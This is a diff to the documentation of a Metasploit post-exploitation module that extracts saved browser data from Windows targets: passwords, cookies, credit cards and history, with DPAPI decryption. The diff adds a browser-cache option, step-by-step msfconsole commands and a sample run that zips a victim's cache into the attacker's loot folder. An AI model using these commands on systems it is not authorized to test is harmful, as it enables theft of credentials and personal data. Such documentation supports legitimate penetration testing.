@@ -1,7 +1,7 @@
 
 # Vulnerable Application
 
-This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, credit card information and installed extensions.
+This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, credit card information, browser cache and installed extensions.
 
 ## Supported Browsers
 
@@ -46,6 +46,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 - Credit Card Information
 - Bookmarks
 - Installed Extensions
+- Browser Cache
 
 ### Gecko-Based Browsers
 
@@ -71,6 +72,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 - Download History
 - Bookmarks
 - Installed Extensions
+- Browser Cache
 
 ## Verification Steps
 
@@ -81,9 +83,10 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 5. (Optional) Specify which browser data to extract: `set BROWSER_TYPE <chromium|gecko|all>` (default is `all`).
 6. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
 7. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
-8. (Optional) Migrate the session to `explorer.exe` before extraction: `set USER_MIGRATION true`
-9. Run the module: `run`
-10. You should see the extracted browser data in the loot files.
+8. (Optional) Extract Browser Cache: `set EXTRACT_CACHE true`
+9. (Optional) Migrate the session to `explorer.exe` before extraction: `set USER_MIGRATION true`
+10. Run the module: `run`
+11. You should see the extracted browser data in the loot files.
 
 ## Options
 
@@ -93,6 +96,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
   - `chromium`: Extracts data only from Chromium-based browsers.
   - `gecko`: Extracts data only from Gecko-based browsers.
   - `all`: Extracts data from both Chromium and Gecko browsers. This is the default setting.
+- **EXTRACT_CACHE** - Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
 - **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
 - **SESSION** - The session to run the module on. Required.
 
@@ -194,6 +198,35 @@ msf6 post(windows/gather/enum_browsers) > run
 ```
 
 This will kill any running browser processes and avoid file access issues.
+
+### Using EXTRACT_CACHE to extract browser cache
+
+Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
+
+```bash
+msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
+KILL_BROWSER => true
+msf6 post(windows/gather/enum_browsers) > run
+
+[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
+[*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
+[*] Starting data extraction from user profile: C:\Users\ah
+[*]
+[*] Found Microsoft Edge (Version: 130.0.2849.46)
+[*] 127 cache files found for Microsoft Edge, total size: 13300 KB
+[*] Zipping progress: 10% (13/127 files processed)
+[*] Zipping progress: 20% (26/127 files processed)
+[*] Zipping progress: 30% (39/127 files processed)
+[*] Zipping progress: 40% (52/127 files processed)
+[*] Zipping progress: 51% (65/127 files processed)
+[*] Zipping progress: 61% (78/127 files processed)
+[*] Zipping progress: 71% (91/127 files processed)
+[*] Zipping progress: 81% (104/127 files processed)
+[*] Zipping progress: 92% (117/127 files processed)
+[*] Zipping progress: 100% (127/127 files processed)
+[*] Cache for Microsoft Edge zipped to: C:\Users\ah\AppData\Local\Temp\ZqNbEJBi.zip
+[+] └ Extracted Cache to /root/.msf4/loot/20241020225508_default_192.168.0.25_MicrosoftEdge_C_443896.zip (8763677 bytes)
+```
 
 ### Using USER_MIGRATION to Run in User Context
 
